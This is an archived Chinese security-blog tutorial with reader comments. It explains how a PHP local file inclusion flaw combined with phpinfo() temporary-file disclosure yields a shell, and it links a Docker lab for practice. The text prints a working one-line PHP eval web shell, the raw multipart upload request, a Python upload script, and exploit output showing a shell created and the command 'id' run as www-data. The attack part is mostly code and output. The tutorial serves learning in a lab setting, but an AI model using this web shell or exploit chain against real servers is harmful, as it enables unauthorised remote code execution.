@@ -1,0 +1,101 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">PHP本地文件包含漏洞环境搭建与利用</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">janes</a> <span class="bull">·</span> <time title="2016/03/15 13:51" ui-time="" datetime="2016/03/15 13:51" class="published ng-binding ng-isolate-scope">2016/03/15 13:51</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 简介</h1><hr><p>php本地文件包含漏洞相关知识，乌云上早有相应的文章，lfi with phpinfo最早由国外大牛提出，可参考下面两篇文章。利用的原理是利用php post上传文件产生临时文件，phpinfo()读临时文件的路径和名字，本地包含漏洞生成1句话后门。</p><p>此方式在本地测试成功，为了方便大家学习，减小学习成本，已构建docker环境，轻松测试。将构建好的docker放在国外VPS上，使用github项目 <a href="https://github.com/hxer/vulnapp/tree/master/lfi_phpinfo">lfi_phpinfo</a> 中poc文件夹下的脚本，本地运行，依然可以getshell。说明这种方式是可行的，对网络要求不是很高。</p><ul><li><p>Docker Hub 镜像地址: <a href="https://hub.docker.com/r/janes/lfi_phpinfo/">janes/lfi_phpinfo</a></p></li><li><p>github 项目地址: <a href="https://github.com/hxer/vulnapp/tree/master/lfi_phpinfo">lfi_phpinfo</a></p></li></ul><blockquote><p>源码存放在 code目录下， 可使用docker再现，poc目录下存放利用脚本</p></blockquote><p>paper:</p><p><a href="http://gynvael.coldwind.pl/download.php?f=PHP_LFI_rfc1867_temporary_files.pdf">http://gynvael.coldwind.pl/download.php?f=PHP&#95;LFI&#95;rfc1867&#95;temporary&#95;files.pdf</a></p><p><a href="http://www.insomniasec.com/publications/LFI%20With%20PHPInfo%20Assistance.pdf">http://www.insomniasec.com/publications/LFI%20With%20PHPInfo%20Assistance.pdf</a></p><h1>0x01 php 上传</h1><hr><p>向服务器上任意php文件<strong>post请求上传文件</strong>时，都会生成临时文件，可以直接在phpinfo页面找到临时文件的路径及名字。</p><ul><li>post上传文件</li></ul><p>php post方式上传任意文件，服务器都会创建临时文件来保存文件内容。</p><p>在HTTP协议中为了方便进行文件传输，规定了一种基于表单的<a href="http://www.faqs.org/rfcs/rfc1867.html"> HTML文件传输方法</a></p><p>其中要确保上传表单的属性是 enctype=”multipart/form-data，必须用POST 参见: <a href="http://www.faqs.org/rfcs/rfc1867.html">php file-upload.post-method</a></p><p>其中PHP引擎对enctype=”multipart/form-data”这种请求的处理过程如下：</p><ol><li>请求到达</li><li>创建临时文件，并写入上传文件的内容</li><li>调用相应PHP脚本进行处理，如校验名称、大小等</li><li>删除临时文件</li></ol><p>PHP引擎会首先将文件内容保存到临时文件，然后进行相应的操作。临时文件的名称是 php+随机字符 。</p><ul><li>$_FILES信息，包括临时文件路径、名称</li></ul><p>在PHP中，有超全局变量$_FILES,保存上传文件的信息，包括文件名、类型、临时文件名、错误代号、大小</p><h1>0x02 手工测试phpinfo()获取临时文件路径</h1><hr><ul><li>html表单</li></ul><p>文件 upload.html</p><pre><code>#!html
+&lt;!doctype html&gt;
+&lt;html&gt;
+&lt;body&gt;
+    &lt;form action="phpinfo.php" method="POST" enctype="multipart/form-data"&gt;
+    &lt;h3&gt; Test upload tmp file&lt;/h3&gt;
+    &lt;label for="file"&gt;Filename:&lt;/label&gt;
+    &lt;input type="file" name="file"/&gt;&lt;br/&gt;
+    &lt;input type="submit" name="submit" value="Submit" /&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><ul><li><p>浏览器访问 upload.html, 上传文件 file.txt</p><pre><code>#!php
+&lt;?php
+eval($_REQUEST["cmd"]);
+?&gt;
+</code></pre></li><li><p>burp 查看POST 信息如下</p><pre><code>#!bash
+POST /LFI_phpinfo/phpinfo.php HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:44.0) Gecko/20100101 Firefox/44.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://127.0.0.1/LFI_phpinfo/upload.html
+Connection: close
+Content-Type: multipart/form-data; boundary=---------------------------11008921013555437861019615112
+Content-Length: 368
+
+-----------------------------11008921013555437861019615112
+Content-Disposition: form-data; name="file"; filename="file.txt"
+Content-Type: text/plain
+
+&lt;?php
+eval($_REQUEST["cmd"]);
+?&gt;
+
+-----------------------------11008921013555437861019615112
+Content-Disposition: form-data; name="submit"
+
+Submit
+-----------------------------11008921013555437861019615112--
+</code></pre></li><li><p>浏览器访问，phpinfo 返回如下信息：</p><pre><code>#!php
+_REQUEST["submit"]  
+    Submit
+
+_POST["submit"] 
+    Submit
+
+_FILES["file"]  
+    Array
+    (
+        [name] =&gt; file.txt
+        [type] =&gt; text/plain
+        [tmp_name] =&gt; /tmp/phpufdCHh
+        [error] =&gt; 0
+        [size] =&gt; 33
+    )
+</code></pre></li></ul><p>得到tmp_name 路径</p><h1>0x03 python脚本 upload file</h1><hr><pre><code>#!python
+import requests
+
+host = '127.0.0.1'
+url = 'http://{ip}/LFI_phpinfo/phpinfo.php'.format(ip=host)
+file_ = '/var/www/LFI_phpinfo/file.txt'
+
+response = requests.post(url, files={"name": open(file_, 'rb')})
+
+print(response.text)
+</code></pre><ul><li><p>部分返回结果</p><pre><code>#!php
+&lt;tr&gt;&lt;td class="e"&gt;_FILES["name"]&lt;/td&gt;&lt;td class="v"&gt;&lt;pre&gt;Array
+(
+    [name] =&amp;gt; file.txt
+    [type] =&amp;gt; 
+    [tmp_name] =&amp;gt; /tmp/php7EvBv3
+    [error] =&amp;gt; 0
+    [size] =&amp;gt; 33
+)
+</code></pre></li></ul><h1>0x04 本地搭建环境</h1><hr><ul><li><p>get shell</p><pre><code>#!bash
+$ python lfi_phpinfo.py 127.0.0.1
+
+LFI with phpinfo()
+==============================
+INFO:__main__:Getting initial offset ...
+INFO:__main__:found [tmp_name] at 67801
+INFO:__main__:
+Got it! Shell created in /tmp/g
+INFO:__main__:Wowo! \m/
+INFO:__main__:Shutting down...
+</code></pre></li><li><p>firefox 访问</p><pre><code>#!bash
+http://127.0.0.1/LFI_phpinfo/lfi.php?load=/tmp/gc&amp;f=id
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre></li></ul><p>说明getshell成功，之后就可以自由发挥了～～</p><h1>0x05 使用 docker 构建环境</h1><p>docker的基本用法，这里就不阐述了，可自行google。这里提供了两种构建镜像源的方式，使用github <a href="https://github.com/hxer/vulnapp/tree/master/lfi_phpinfo">lfi_phpinfo</a> 中Dockerfile自行构建，或使用我已经构建好的镜像 <a href="https://hub.docker.com/r/janes/lfi_phpinfo/">janes/lfi_phpinfo</a></p><ul><li>镜像源</li></ul><p>-- &#91;php 1="官方源" 2="2=&quot;2=&quot;2=&quot;2=&quot;language=&quot;:5.6-apache&quot;&quot;&quot;&quot;&quot;\"]&#91;/php&#93;<a href="http://gynvael.coldwind.pl/download.php?f=PHP_LFI_rfc1867_temporary_files.pdf">/php</a><a href="https://hub.docker.com/_/php/">5</a></p><p>或</p><p>-- <a href="https://hub.docker.com/r/janes/lfi_phpinfo/">janes/lfi_phpinfo</a></p><ul><li>构建环境运行测试</li></ul><p>获取 github <a href="https://github.com/hxer/vulnapp/tree/master/lfi_phpinfo">lfi_phpinfo</a> 的源码，切换到web目录下，开始构建环境进行测试。这里提供三种方式运行</p><ol><li><p>方式1 使用php官方源运行测试</p><pre><code>#!bash
+docker run --rm -v code/:/var/www/html -p 80:80 php:5.6-apache
+</code></pre></li><li><p>方式2 使用构建好的镜像 <a href="https://hub.docker.com/r/janes/lfi_phpinfo/">janes/lfi_phpinfo</a> 运行测试</p><pre><code>#!bash
+docker pull "janes/lfi_phpinfo"
+docker run --rm -p "80:80" janes/lfi_phpinfo
+</code></pre></li><li><p>方式3 使用docker-compose</p><pre><code>#!bash  
+docker-compose up
+</code></pre></li></ol><p>接下来就可以使用python脚本 getshell 了</p><pre><code>#!bash
+python lfi_phpinfo.py docker_host_ip
+</code></pre><h1>0x06 结束语</h1><hr><p>动手实践 LFI with PHPInfo利用的过程，其实并不像看文章过程那样顺利，期间多多少少会碰见一些与环境有关的问题，而解决这些问题会耗费精力，这正是催生我用docker来构建测试环境想法的来源，希望能给网络安全的热爱者们提供更方便的学习环境。最后感谢[LFI with PHPInfo本地测试过程]文章的作者，给我研究LFI with phpinfo提供了不少帮助。</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/870" rel="bookmark" id="re1">hackyou2014 CTF web关卡通关攻略</a></li><li><a href="http://drops.wooyun.org/web/11837" rel="bookmark" id="re2">PHP DOS漏洞的新利用：CVE-2015-4024 Reviewed</a></li><li><a href="http://drops.wooyun.org/tips/3420" rel="bookmark" id="re3">Hack.lu 2014 Writeup</a></li><li><a href="http://drops.wooyun.org/papers/1957" rel="bookmark" id="re4">代码审计之逻辑上传漏洞挖掘</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">无敌情痴</span> <span class="reply-time">2016-04-04 09:54:15</span></div><p></p><p>谢谢分享，好文章</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">janes</span> <span class="reply-time">2016-03-17 15:23:24</span></div><p></p><p>@safetech 可以看 @从容 的回答，lfi.php可以泛指存在LFI利用的php文件</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">janes</span> <span class="reply-time">2016-03-17 15:21:10</span></div><p></p><p>@handsometian 暂时还不知道</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">janes</span> <span class="reply-time">2016-03-17 15:20:47</span></div><p></p><p>@夜尽天明 phpinfo的作用是获取临时文件的位置信息，而实际中很难碰到使用phpinfo()函数，这是利用的一个难点，$_FILES全局变量能产生同样的效果。这里的phpinfo是用来演示的</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">handsometian</span> <span class="reply-time">2016-03-17 10:32:20</span></div><p></p><p>学习了，不知道哪个cms有这种本地包含。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">夜尽天明</span> <span class="reply-time">2016-03-17 10:03:01</span></div><p></p><p>同问，phpinfo哪里来</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">十六薙夜血</span> <span class="reply-time">2016-03-17 09:53:01</span></div><p></p><p>不错的教程啊！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">safetech</span> <span class="reply-time">2016-03-16 23:42:31</span></div><p></p><p>lfi.php哪里来的。。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">第四维度</span> <span class="reply-time">2016-03-16 19:54:06</span></div><p></p><p>非常棒，学习了。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">depycode</span> <span class="reply-time">2016-03-16 16:30:50</span></div><p></p><p>@h3hz phpinfo _FILES</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">h3hz</span> <span class="reply-time">2016-03-16 12:55:52</span></div><p></p><p>问题是 tmp_name =&gt; string tmp/php6769.tmp 这个临时文件传到哪里了怎么得到的</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">从容</span> <span class="reply-time">2016-03-15 22:03:54</span></div><p></p><p>@happyweidy 是存在LFI的利用。。。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">happyweidy</span> <span class="reply-time">2016-03-15 19:53:34</span></div><p></p><p>关键是lfi.php怎么弄到服务器上去？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">backtrack丶yao</span> <span class="reply-time">2016-03-15 18:41:37</span></div><p></p><p>学习了</p><p></p></div></div></div></div></div></main>
